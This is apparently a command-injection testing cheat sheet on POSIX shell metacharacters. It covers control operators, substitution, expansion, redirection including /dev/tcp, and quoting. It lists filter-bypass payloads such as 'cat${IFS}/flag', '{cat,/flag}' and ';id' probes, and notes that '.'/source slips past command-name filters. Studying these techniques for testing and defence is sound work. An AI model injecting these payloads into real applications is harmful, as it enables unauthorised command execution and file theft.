# Shell Tricks — the POSIX metachar deep-dive

## The shell's actual grammar — what it tokenizes

`sh -c 'x;id'` — the shell splits on `;` `&` `|` `\n` — then word-splits
on IFS — then expands `$` `` ` `` `~` `*?[]` `{,}` — in that order.
Understanding the ORDER tells you which byte to attack.

```
tokens:  ; & | ( ) < > << >> ;& ;;& |& ;| ;;    — control ops
words:   name=value cmd arg...                  — word-list
expand:  $var ${..} `..` $(..) ~ *?[] {,} <>   — expansions
quote:   'x' "x" \x $'x' $"x"                  — quoting
```

## `;` `&` `|` `\n` — the control operators

| Op | Semantics |
|---|---|
| `;` | sequential — run next regardless |
| `&` | background — run next in parallel |
| `&&` | run next if prev exit==0 |
| `\|\|` | run next if prev exit!=0 |
| `\|` | pipe stdout→stdin |
| `\|&` | pipe stdout+stderr |
| `\n` | same as `;` |
| `;&` `;;&` `;;` | case-terminators (case-context) |
| `( )` `{ }` | subshell/group |

## `$( )` `` ` `` — command substitution

- `$(id)`/`` `id` `` — the OUTPUT replaces the substitution —
  `x$(id)` → `x` + output concat'd
- `$( )` nests cleanly — `` ` `` uses `\` escapes for nesting
- inside `"x$(id)"` — still evaluates
- inside `'x$(id)'` — LITERAL — no eval

## `~` `*?[]` `{,}` — expansion operators

- `~` — home-dir expansion — `~user`/`~`/`~+`/`~-`
- `*` `?` `[...]` — globbing — `wildcard-globbing.md`
- `{a,b}`/`{1..5}`/`{a..z}` — brace expansion — `{cat,/flag}` runs
  `cat /flag` — the `{,}` trick survives space-filters
- `${...}` — parameter expansion — `variable-tricks.md`

## `<` `>` `>>` `2>` `2>>` `&>` `>&` `<>` `<<` `<<<` — redirection

```
cmd > file     — stdout to file (truncate)
cmd >> file    — stdout append
cmd < file     — stdin from file
cmd 2> file    — stderr to file
cmd &> file    — stdout+stderr
cmd <> file    — read+write
cmd <<EOF      — heredoc
cmd <<<str     — herestring
cmd >|file     — noclobber-override
cmd >&2        — stdout→stderr-fd
cmd 2>&1       — stderr→stdout-fd
exec 3<>file   — fd juggling
cmd > /dev/tcp/h/p   — bash tcp
cmd < /dev/tcp/h/p   — bash tcp-read
```

## `"` `'` `\` `$'..'` `$".."` — quoting levels

| Context | `$` | `` ` `` | `\` | split |
|---|---|---|---|---|
| unquoted | yes | yes | escape | yes |
| `'x'` | no | no | literal | no |
| `"x"` | yes | yes | `$` `` ` `` `\` `"` `\n` | no |
| `$'x'` | no | no | ANSI-C escapes | no |
| `$"x"` | locale-translate | — | — | — |

The quoting-level decides which meta survives — `quoting.md`.

## `$` expansion — the variable family

```
$x ${x} ${x:-d} ${x:=d} ${x:+d} ${x:?e} ${x#p} ${x##p} ${x%p} ${x%%p}
${x/p/r} ${x//p/r} ${x:off:len} ${x^} ${x^^} ${x,} ${x,,} ${!x} ${#x}
${x@Q} ${x@E} ${x@P} ${x@A} ${!x@} ${!x*} ${!x[*]}
$* $@ $# $- $$ $? $! $0 $1..$9 $n
$IFS $PATH $HOME $PWD $SHELL $RANDOM $SECONDS $UID $EUID $HOSTNAME
$BASH_ENV $ENV $PROMPT_COMMAND $PS1..$4 $FUNCNAME $BASH_SOURCE $SHLVL
```

## `(( ))` `$[ ]` `let` `expr` — arithmetic

```
$((x)) $(( x + y )) $((x<<2)) $((x&y))
$[x]         — legacy arithmetic
let x=y+z
expr x + y
$((0x10))    — hex
$((2#101))   — binary
```

Arithmetic doesn't exec but evaluates — a `((7*7))`-shaped probe
distinguishes a math-evaluator from a shell.

## `!` `^` `:` `#` — the misc meta

- `!cmd` — history expansion (interactive only)
- `^x^y` — quick-substitution (interactive only)
- `:` — the no-op/true builtin — `:;id`? — `:` eats a line
- `#` — comment — `#id` comments out the rest
- `.`/`source` — source a file — `. /tmp/x` runs x as shell-code
- `[`/`test`/`[[` — test builtin

## The `IFS` — the field-splitter byte

`IFS` default `\t\n ` — word-split happens AFTER variable expansion —
`${IFS}`/`$IFS`/`$IFS$9` substitute a space/tab/newline — the classic
space-filter bypass:

```
cat${IFS}/flag
cat$IFS$9/flag
{cat,/flag}
cat</flag
```

## The `$$`/`$!`/`$?`/`$0`/`$n` — special vars

- `$$` — the shell's PID
- `$!` — last bg PID
- `$?` — last exit code — `0`/`1`/`127` channels
- `$0` — the script name/shell name
- `$1..$9`/`${10}` — positional args
- `$*`/`$@` — all args
- `$#` — arg count

## The `.`/`source` builtin — file-as-code

`. /tmp/x`/`source /tmp/x` — reads and executes the file — a file-write
+ `.` is a two-step exec. `.`/`source` are often left out of
command-name filters since they're punctuation.

## The `exec` builtin — process replacement

`exec id` — replaces the shell — `exec 3<>/tmp/x` — fd tricks.
`exec` inside `$( )` — `$(exec id)` — same output.

## The `printf`/`echo` — the write primitives

```
printf %s 'x' > /tmp/o
echo x > /tmp/o
echo -e 'x\ny' > /tmp/o
echo x | tee /tmp/o
```

## The `$( )`/`{ }`/`( )` group-exec

- `(id;id)` — subshell — runs both
- `{ id;id; }` — group — same shell
- `$(id;id)` — substitution captures output
- `x(id)`— function-call syntax — `x(){id;}` defines `x`

## Falsifiers

- none of the meta/expand/substitution/redirect forms reach a shell —
  the boundary is argv/eval

## Output to record

- which POSIX construct passed the filter + the verbatim output
